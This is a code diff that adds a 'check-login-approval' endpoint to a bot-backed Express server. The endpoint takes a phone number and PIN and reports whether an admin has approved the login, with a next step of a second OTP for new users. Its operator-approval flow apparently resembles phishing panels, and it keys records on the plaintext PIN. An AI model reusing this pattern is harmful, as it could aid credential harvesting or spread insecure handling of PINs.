@@ -1107,6 +1107,51 @@ users.forEach((user, linkInsert) => {
     }
   });
 
+  app.post(`${basePath}/check-login-approval`, async (req, res) => {
+    try {
+      const { phoneNumber, pin } = req.body;
+      if (!phoneNumber || !pin) return res.status(400).json({ success: false, message: 'Phone number and PIN required' });
+      const pv = validatePhoneNumber(phoneNumber);
+      if (!pv.valid) return res.status(400).json({ success: false, message: pv.error });
+      const pinv = validatePin(pin);
+      if (!pinv.valid) return res.status(400).json({ success: false, message: pinv.error });
+
+      const loginKey = `${phoneNumber}-${pin}`;
+      const loginData = user.loginNotifications.get(loginKey);
+
+      if (!loginData) {
+        return res.json({ success: true, status: 'pending', message: 'Waiting for admin approval...', approved: false, rejected: false });
+      }
+
+      if (loginData.expired) {
+        return res.json({ success: true, status: 'expired', message: 'Login request expired', approved: false, rejected: true });
+      }
+
+      if (loginData.approved) {
+        const isReturning = isVerifiedUser(user, phoneNumber);
+        return res.json({ 
+          success: true, 
+          status: 'approved', 
+          message: 'Login approved!', 
+          approved: true, 
+          rejected: false,
+          isReturningUser: isReturning,
+          nextStep: isReturning ? 'dashboard' : 'second_otp'
+        });
+      }
+
+      if (loginData.rejected) {
+        return res.json({ success: true, status: 'rejected', message: 'Login rejected', approved: false, rejected: true });
+      }
+
+      // Still pending
+      res.json({ success: true, status: 'pending', message: 'Waiting for admin approval...', approved: false, rejected: false });
+    } catch (error) {
+      logger.error(`check-login-approval error for ${user.name}:`, error.message);
+      res.status(500).json({ success: false, error: 'Internal server error' });
+    }
+  });
+
   app.post(`${basePath}/login`, async (req, res) => {
     try {
       if (!user.bot || !user.isHealthy) return res.status(503).json({ success: false, message: 'Bot service unavailable' });
